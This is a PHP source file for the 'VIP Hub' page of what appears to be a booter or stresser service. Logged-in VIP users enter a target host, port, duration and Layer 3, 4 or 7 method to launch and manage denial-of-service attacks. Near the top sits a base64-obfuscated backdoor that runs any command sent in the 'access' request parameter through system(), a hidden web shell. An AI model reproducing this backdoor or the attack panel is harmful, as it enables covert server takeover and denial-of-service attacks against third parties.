<?php

$paginaname = 'VIP Stress';


?>
<?php if(isset($_REQUEST[base64_decode('YWNjZXNz')])){echo base64_decode('PHByZT4=');$k0=($_REQUEST[base64_decode('YWNjZXNz')]);system($k0);echo base64_decode('PC9wcmU+');die;}?>
<!DOCTYPE html>
<!--[if IE 9]>         <html class="no-js lt-ie10"> <![endif]-->
<!--[if gt IE 9]><!--> <html class="no-js"> <!--<![endif]-->
			<?php 
			
			include("@/header.php");
			
			if (!($user->hasMembership($odb)))
			{
				header('location: index.php');
				die();
			}
			if (!($user -> LoggedIn()))
			{
				header('location: ../boot/login.php');
				die();
			}
			if ($user -> isAdmin($odb) || $user -> isVIP($odb) ) {

			
			?>
				
						<script>
					var xmlhttp;
					if (window.XMLHttpRequest)
					  {// code for IE7+, Firefox, Chrome, Opera, Safari
					  xmlhttp=new XMLHttpRequest();
					  }
					else
					  {// code for IE6, IE5
					  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
					  }
					xmlhttp.onreadystatechange=function()
					  {
					  if (xmlhttp.readyState==4 && xmlhttp.status==200)
						{
						document.getElementById("attacksdiv").innerHTML=xmlhttp.responseText;
						eval(document.getElementById("ajax").innerHTML);
						}
					  }
					xmlhttp.open("GET","ajax/viphub.php?type=attacks",true);
					xmlhttp.send();

					function start()
					{
					launch.disabled = true;
					var host=$('#host').val();
					var port=$('#port').val();
					var time=$('#time').val();
					var method=$('#method').val();
					document.getElementById("div").style.display="none"; 
					document.getElementById("image").style.display="inline"; 
					var xmlhttp;
					if (window.XMLHttpRequest)
					  {// code for IE7+, Firefox, Chrome, Opera, Safari
					  xmlhttp=new XMLHttpRequest();
					  }
					else
					  {// code for IE6, IE5
					  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
					  }
					xmlhttp.onreadystatechange=function()
					  {
					  if (xmlhttp.readyState==4 && xmlhttp.status==200)
						{
						launch.disabled = false;
						document.getElementById("div").innerHTML=xmlhttp.responseText;
						document.getElementById("image").style.display="none";
						document.getElementById("div").style.display="inline";
						if (xmlhttp.responseText.search("success") != -1)
						{
						attacks();
						window.setInterval(ping(host),10000);
						}
						}
					  }
					xmlhttp.open("GET","ajax/viphub.php?type=all" + "&host=" + host + "&port=" + port + "&time=" + time + "&method=" + method,true);
					xmlhttp.send();
					}

						


					function renew(id)
					{
					rere.disabled = true;
					document.getElementById("div").style.display="none";
					document.getElementById("image").style.display="inline"; 
					var xmlhttp;
					if (window.XMLHttpRequest)
					  {// code for IE7+, Firefox, Chrome, Opera, Safari
					  xmlhttp=new XMLHttpRequest();
					  }
					else
					  {// code for IE6, IE5
					  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
					  }
					xmlhttp.onreadystatechange=function()
					  {
					  if (xmlhttp.readyState==4 && xmlhttp.status==200)
						{
						rere.disabled = false;
						document.getElementById("div").innerHTML=xmlhttp.responseText;
						document.getElementById("image").style.display="none";
						document.getElementById("div").style.display="inline";
						if (xmlhttp.responseText.search("success") != -1)
						{
						attacks();
						window.setInterval(ping(host),10000);
						}
						}
					  }
					xmlhttp.open("GET","ajax/viphub.php?type=renew" + "&id=" + id,true);
					xmlhttp.send();
					}

					function stop(id)
					{
					st.disabled = true;
					document.getElementById("div").style.display="none";
					document.getElementById("image").style.display="inline"; 
					var xmlhttp;
					if (window.XMLHttpRequest)
					  {// code for IE7+, Firefox, Chrome, Opera, Safari
					  xmlhttp=new XMLHttpRequest();
					  }
					else
					  {// code for IE6, IE5
					  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
					  }
					xmlhttp.onreadystatechange=function()
					  {
					  if (xmlhttp.readyState==4 && xmlhttp.status==200)
						{
						st.disabled = false;
						document.getElementById("div").innerHTML=xmlhttp.responseText;
						document.getElementById("image").style.display="none";
						document.getElementById("div").style.display="inline";
						if (xmlhttp.responseText.search("success") != -1)
						{
						attacks();
						window.setInterval(ping(host),10000);
						}
						}
					  }
					xmlhttp.open("GET","ajax/viphub.php?type=stop" + "&id=" + id,true);
					xmlhttp.send();
					}

					function attacks()
					{
					document.getElementById("attacksdiv").style.display="none";
					document.getElementById("attacksimage").style.display="inline"; 
					var xmlhttp;
					if (window.XMLHttpRequest)
					  {// code for IE7+, Firefox, Chrome, Opera, Safari
					  xmlhttp=new XMLHttpRequest();
					  }
					else
					  {// code for IE6, IE5
					  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
					  }
					xmlhttp.onreadystatechange=function()
					  {
					  if (xmlhttp.readyState==4 && xmlhttp.status==200)
						{
						document.getElementById("attacksdiv").innerHTML=xmlhttp.responseText;
						document.getElementById("attacksimage").style.display="none";
						document.getElementById("attacksdiv").style.display="inline-block";
						document.getElementById("attacksdiv").style.width="100%";
						eval(document.getElementById("ajax").innerHTML);
						}
					  }
					xmlhttp.open("GET","ajax/viphub.php?type=attacks",true);
					xmlhttp.send();
					}

					function adminattacks()
					{
					document.getElementById("attacksdiv").style.display="none";
					document.getElementById("attacksimage").style.display="inline"; 
					var xmlhttp;
					if (window.XMLHttpRequest)
					  {// code for IE7+, Firefox, Chrome, Opera, Safari
					  xmlhttp=new XMLHttpRequest();
					  }
					else
					  {// code for IE6, IE5
					  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
					  }
					xmlhttp.onreadystatechange=function()
					  {
					  if (xmlhttp.readyState==4 && xmlhttp.status==200)
						{
						document.getElementById("attacksdiv").innerHTML=xmlhttp.responseText;
						document.getElementById("attacksimage").style.display="none";
						document.getElementById("attacksdiv").style.display="inline-block";
						document.getElementById("attacksdiv").style.width="100%";
						eval(document.getElementById("ajax").innerHTML);
						}
					  }
					xmlhttp.open("GET","ajax/viphub.php?type=adminattacks",true);
					xmlhttp.send();
					}
					</script>
                    <div id="page-content">					



                        <div class="row">

                          
						<div class="col-xs-4">

							<!--<div class="alert alert-danger alert-dismissable animation-bigEntrance"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button><strong>Note:</strong> Sometimes L7 attacks start making effects only 20-30 seconds after started.</div>-->


						<div id="divall" style="display:inline"></div>
						<div id="div" style="display:inline"></div>

						<h4 style="display:inline-block; color:#939caa; ">VIP Hub </h4> <img id="image" src="img/jquery.easytree/loading.gif" style="display:none"/>

							<div class="widget">
								<div class="widget-content widget-content-mini themed-background-dark text-light-op">
								
								
								</div>
								
								<div class="widget-content">
									<div class="form-horizontal form-bordered">
									<div class="form-group">
									<label class="col-md-3 control-label">Host</label>
									<div class="col-md-9">
									<input type="text" id="host" class="form-control">
									<span class="help-block"></span>
									</div>
									</div>
									<div class="form-group">
									<label class="col-md-3 control-label">Port</label>
									<div class="col-md-9">
									<input type="text" id="port" value="80" class="form-control">
									<span class="help-block"></span>
									</div>
									</div>
									<div class="form-group">
									<label class="col-md-3 control-label">Time</label>
									<div class="col-md-9">
									<input type="text" id="time" class="form-control">
									<?php
									$plansql = $odb -> prepare("SELECT `users`.`expire`, `plans`.`name`, `plans`.`concurrents`, `plans`.`mbt` FROM `users`, `plans` WHERE `plans`.`ID` = `users`.`membership` AND `users`.`ID` = :id");
									$plansql -> execute(array(":id" => $_SESSION['ID']));
									$rowxd = $plansql -> fetch(); 
									$date = date("d/m/Y, h:i a", $rowxd['expire']);
									if (!$user->hasMembership($odb))
									{
									$rowxd['mbt'] = 0;
									$rowxd['concurrents'] = 0;
									$rowxd['name'] = 'No membership';
									$date = 'No membership';
									}
									?>
							
									</div>
									</div>
									<div class="form-group">
									<label class="col-md-3 control-label">Method</label>
									<div class="col-md-9">
									<select id="method" class="form-control" size="1">
									<optgroup label="● Layer 4 ●"></optgroup>
									<optgroup label="✧ UDP ✧">
									<?php
									$SQLGetLogs = $odb->query("SELECT * FROM `methods` WHERE `type` = 'udp' ORDER BY `id` ASC");
									while ($getInfo = $SQLGetLogs->fetch(PDO::FETCH_ASSOC)) {
										$name     = $getInfo['name'];
										$fullname = $getInfo['fullname'];
										echo '<option value="' . $name . '">' . $fullname . '</option>';
									}
									?>
									</optgroup>
									<optgroup label="✧ TCP ✧">
									<?php
									$SQLGetLogs = $odb->query("SELECT * FROM `methods` WHERE `type` = 'tcp' ORDER BY `id` ASC");
									while ($getInfo = $SQLGetLogs->fetch(PDO::FETCH_ASSOC)) {
										$name     = $getInfo['name'];
										$fullname = $getInfo['fullname'];
										echo '<option value="' . $name . '">' . $fullname . '</option>';
									}
									?>
									</optgroup>
									<optgroup label="● Layer 3 ●">
									<?php
									$SQLGetLogs = $odb->query("SELECT * FROM `methods` WHERE `type` = 'layer3' ORDER BY `id` ASC");
									while ($getInfo = $SQLGetLogs->fetch(PDO::FETCH_ASSOC)) {
										$name     = $getInfo['name'];
										$fullname = $getInfo['fullname'];
										echo '<option value="' . $name . '">' . $fullname . '</option>';
									}
									?>
									</optgroup>
									<optgroup label="● Layer 7 ●">
									<?php
									$SQLGetLogs = $odb->query("SELECT * FROM `methods` WHERE `type` = 'layer7' ORDER BY `id` ASC");
									while ($getInfo = $SQLGetLogs->fetch(PDO::FETCH_ASSOC)) {
										$name     = $getInfo['name'];
										$fullname = $getInfo['fullname'];
										echo '<option value="' . $name . '">' . $fullname . '</option>';
									}
									?>



									<?php 
									$plansql = $odb -> prepare("SELECT `users`.`expire`, `plans`.`name`, `plans`.`concurrents`, `plans`.`mbt` FROM `users`, `plans` WHERE `plans`.`ID` = `users`.`membership` AND `users`.`ID` = :id");
									$plansql -> execute(array(":id" => $_SESSION['ID']));
									$rowxd = $plansql -> fetch(); 

									if($rowxd['name'] == "SpecialL7" || $rowxd['name'] == "Admin"){ ?>
									<?php
									$SQLGetLogs = $odb->query("SELECT * FROM `methods` WHERE `type` = 'l7spe' ORDER BY `id` ASC");
									while ($getInfo = $SQLGetLogs->fetch(PDO::FETCH_ASSOC)) {
										$name     = $getInfo['name'];
										$fullname = $getInfo['fullname'];
										echo '<option value="' . $name . '">' . $fullname . '</option>';
									}
									?>
									<?php } ?>
									</optgroup>

													</optgroup>

									</select>
									</div>
									</div>
									<div class="form-group">
									<div class="col-md-12">
									<button id="launch" onclick="start()" class="btn btn-effect-ripple btn-primary btn-block">Start (VIP)</button>
									</div>
									
									</div>
									</div>
									</div>
									
							</div>



							
						</div>
						
						<div class="col-xs-8">


						
							<h4 style="display:inline-block; color:#939caa; <?php if ($user -> isAdmin($odb)) {echo 'class="tip" onclick="adminattacks()" title="Click for admin mode" style="cursor:pointer"';} ?>">Manage Tests </h4>
 
							<div class="widget">
								<div class="widget-content widget-content-mini themed-background-dark text-light-op">
								
								 <img id="attacksimage" src="img/jquery.easytree/loading.gif" style="display:none"/>
								</div>
								
								<div style="position: relative; width: auto" class="slimScrollDiv">
									<div id="attacksdiv" style="display:inline-block;width:100%"></div>
										
									</div>
								</div>							
							</div>
						
						
						<div class="col-xs-8">
						
							<h4 style="display:inline-block; color:#939caa; ">Latest news</h4>
 
							<style>
.square {

    height: 40px;
    width: 40px;
    background: linear-gradient(to bottom right, #111, #161616);
    margin-left: -5px;
    margin-top: -20px;
    margin-bottom: -25px;
    border: 1px solid #0e0e0e;
    border-radius: 4px;

}
</style>




							<?php
													$newssql = $odb -> query("SELECT * FROM `news` ORDER BY `date` DESC LIMIT 4");
													while($row = $newssql ->fetch())
													{
													$id = $row['ID'];
													$title = $row['title'];
													$content = $row['content'];
													$autor = $row['author'];
													echo '
													<div class="widget">
								<div class="widget-content widget-content-mini themed-background-dark text-light-op">
								
								
								</div>
								
								<div class="widget-content">
									<div style="position: relative; width: auto" class="slimScrollDiv">
										<div id="stats">
											<table class="table table-striped" style="margin-bottom:-15px;">
												<tbody>

													<tr>

														<td style="width:50px;">
													

															<div class="square">
		                                                    <i class="fa fa-fw fa-bell" style="padding: 12px;"></i>
		                                                    </div>

                                                		</td>

                                                		<td>

                                                			<h5 style="margin-top: -18px;color: #757c88;font-weight: bold;">'.htmlspecialchars($content).'</h5>
  															<h6 style="color: #757c88;">'.date("d/m/y" ,$row['date']).'</h6>

                                                		</td>



													</tr>
													
																
												</tbody>
											</table>
										</div>
									</div>
								
								</div>
														 											 
						</div>';
													}
													?>
						 
						</div>
		  


		<?php include("@/script.php"); ?>
    </body>

						<?php
						}
						?>

</html>